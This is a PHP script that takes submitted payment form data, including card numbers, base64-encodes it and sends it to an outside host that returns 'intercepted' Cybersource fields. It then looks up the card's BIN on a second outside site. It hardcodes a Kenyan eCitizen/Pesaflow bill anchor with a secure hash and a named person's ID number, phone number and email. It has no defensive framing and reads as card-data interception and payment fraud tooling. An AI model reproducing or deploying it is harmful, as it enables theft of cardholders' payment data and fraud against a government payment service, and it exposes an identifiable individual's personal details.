<?php
header('Content-Type: application/json');

function formatStateCode($stateCode) {
    // Check if the state code is numeric
    if (is_numeric($stateCode)) {
        // Convert to integer and format with leading zeros
        return str_pad((int)$stateCode, 3, '0', STR_PAD_LEFT);
    }
    // Return the state code as-is if it's not numeric
    return $stateCode;
}

$data = $_POST;
$data['anchor'] = 'amountExpected=650.00&apiClientID=1&billDesc=OFFICIAL%20SEARCH%20(%22CR12%22)&billRefNumber=X8VJM3&callBackURLOnFail=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fpayments%2FX8VJM3%2Fcallback%2Ffailed&callBackURLOnSuccess=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fpayments%2FX8VJM3%2Fcallback%2Fsuccess&clientEmail=bombardier.devs.master%40gmail.com&clientIDNumber=4917833&clientMSISDN=%2B254756754595&clientName=GODFREY%20GITAU%20NGURE&currency=KES&notificationURL=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fapi%2Fpayments%2Fpesaflow-ipn&secureHash=ODAwNTBjZjQzMWE4NzZmMjNhZDE4M2E1OTJiMzFjNGZmMzU2YTUwN2ZlOTFiMDVkMmEyMmMzOTliMDcwNzkxYQ%3D%3D&serviceID=42&clientType=1';
$data['bill_to_address_state'] = formatStateCode($data['bill_to_address_state']);
$json = json_encode($data);
$base64 = base64_encode($json);
$url = 'https://pesaflow.fly.dev/?obj=' . urlencode($base64);

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$error = curl_error($ch);
curl_close($ch);

// If cURL failed
if ($error) {
    echo json_encode([
        'success' => false,
        'error' => "Curl error: $error",
        'raw_response' => $response
    ]);
    exit;
}

// Try decode
$parsed = json_decode($response, true);

// If not JSON, return raw content for debugging
if (json_last_error() !== JSON_ERROR_NONE || !isset($parsed['intercepted'][0]['fields'])) {
    echo json_encode([
        'success' => false,
        'error' => 'Full response is not valid JSON or expected format',
        'json_error' => json_last_error_msg(),
        'http_code' => $httpCode,
        //'raw_response' => $base64,
        //'raw_response' => $json.' - '.$response,
        //'raw_response' => $response
        'raw_response' => 'Error processing request!'
    ]);
    exit;
}

// Normal flow continues here if JSON is valid
$fields = $parsed['intercepted'][0]['fields'];
$_POST = $fields;
ob_start();
include 'cybersrc.php';
$interpreted = json_decode(ob_get_clean(), true);

// Get BIN info
$bin = substr(preg_replace('/\\D/', '', $data['card_number'] ?? ''), 0, 6);
$binData = [];
if ($bin) {
    $binUrl = 'https://payment.tsavo.site/get_bin.php?bin=' . urlencode($bin);
    $ch = curl_init($binUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $binResp = curl_exec($ch);
    if (!curl_error($ch)) {
        $binData = json_decode($binResp, true);
    }
    curl_close($ch);
}

echo json_encode([
    'success' => true,
    'cybersource_interpretation' => $interpreted,
    'bin_info' => $binData,
    'raw_fields' => $fields
]);
